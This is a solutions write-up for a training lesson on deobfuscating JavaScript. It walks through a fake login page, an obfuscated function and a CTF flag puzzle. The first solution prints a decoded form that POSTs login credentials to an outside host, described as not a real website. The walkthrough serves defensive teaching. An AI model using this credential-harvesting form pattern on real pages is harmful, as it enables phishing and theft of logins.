# Solutions
This document contains the solutions for the practice problems in this lesson.

# JavaScript
## FakeLoginExample.html
**Objective: Find the URL to which credentials are being exfiltrated.**

By first opening the file, we see that the text is encoded.The frequent `%` signs indicate that this is URL encoded. You can decode the text using the URL decode feature on [CyberChef](https://gchq.github.io/CyberChef). 

After decoding the string, we get a complete HTML framework that has CSS and JS included. The CSS and HTML can be ignored. Usually credentials are exfiltrated through a user input or form which occurs in Javascript. 

Look for JavaScript in the decoded string. There is a script tag in the code:
```javascript
    <script>
      var tag = document.getElementById('tag')
      tag.innerHTML = atob("PGZvcm0gUE9TVD0iaHR0cDovL2FubmFsYW5lcy5jb20vZmlsZXRoaXNhd2F5L3R4dC50eHQiPg==")
    </script>
```

The atob() function is another version of encoding-- Base64. We can use CyberChef to decode the string, which in this case becomes 
```html
<form POST="http://annalanes.com/filethisaway/txt.txt">
```

This code indicates that when the form in the HTML is submitted, the information is sent to the URL `http://annalanes.com/filethisaway/txt.txt`

**Answer: The credentials are exfiltrated to http[:]//annalanes[.]com/filethisaway/txt.txt (not a real website!)**

## reverseJavaScriptExample.js
**Goal: Figure out what line 33 will print out**
```javascript
console['log'](myFunction(0x14, 0xa));
```

First put the entire javascript code into [beautifier.io](https://beautifier.io/). It won't do too much. One of the key tips for reverse engineering is to check outputs, strings, and function calls.

Output: the console.log statement on line 33

Strings: The only strings related to the output are the variables passed into the function `myFunction`, which are `0x14` and `0xa`. These are hexadecimal characters which represent the decimal numbers `20` and `10`, respectively.

Function calls: Let's now analyze the function `myFunction`

```javascript
function myFunction(_0xa4d92a, _0x45c33b) {
  return _0xa4d92a * _0x45c33b;
}
```

We see that this function simply returns the product of the two variables passed into the function. So, the console.log just prints the product of the two numbers passed into it. Since `20` and `10` were passed into the function, the output should be `200`.

The rest of the code was simply added as an obfuscation technique and does nothing. By running the code on [jsconsole](https://jsconsole.com/), you can see that the output is indeed 200.

**Answer: The console will output 200.**

## reverseJavascriptPractice.js
** Goal: find the flag. (The flag format will match the regex `.*{.*}`)**

First put the entire javascript code into [beautifier.io](https://beautifier.io/). It will format it to be a little nicer. One of the key tips for reverse engineering is to check outputs. If you look at the bottom of the beautified JS, you will see:
```javascript
const item = ['a', 'n', 'n', 'a', ':', '!', ')', '{', 'x', 'o', 'y', 'g', 's', 's', 'p', 'p', 'g', 'r', 'l', '}'];
for (let i = 0x0; i < item[_0x361ee1(0x173)]; i++) {
    item[i] !== 'p' && i % 0x5 != 0x0 && console[_0x361ee1(0x16b)](item[i]);
}
```

This is the output statement since we see it has a print console statement. The print console statement conditionals will print any letter in the *item* array that is not equal to 'p' or any item in the array that is not at an indice that is a multiple of 5. If you iterate through the array one by one, you will see that the console will output `nna:){xogssgrl}`

**Answer: the flag is `nna:){xogssgrl}`**